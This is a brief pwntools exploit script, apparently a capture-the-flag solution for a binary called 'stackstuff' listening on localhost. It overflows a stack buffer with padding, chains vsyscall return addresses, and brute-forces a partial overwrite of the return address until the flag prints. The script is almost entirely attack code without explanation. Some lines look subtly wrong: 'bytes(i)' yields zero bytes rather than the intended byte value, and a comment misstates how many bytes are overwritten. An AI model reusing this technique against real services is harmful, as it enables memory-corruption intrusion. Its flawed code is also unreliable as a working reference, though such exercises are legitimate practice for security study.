from pwn import *

target_process = process('./stackstuff')

flag = 0
i = 0x00

while flag == 0:
    target = remote('127.0.0.1', 1514)

    payload = b'0' * 0x48

    vsyscall_ret = p64(0xffffffffff600800)

    payload += vsyscall_ret * 2

    # overwrite the least 4 bytes
    payload += b'\x8b'
    payload += bytes(i)

    target.sendline('90')

    target.sendline(payload)

    target.recvuntil('Length of password: ')
    try:
        print('flag:', target.recvline())
        flag = 1
    except:
        print(f'Tried {hex(i)}')
        i += 0x10
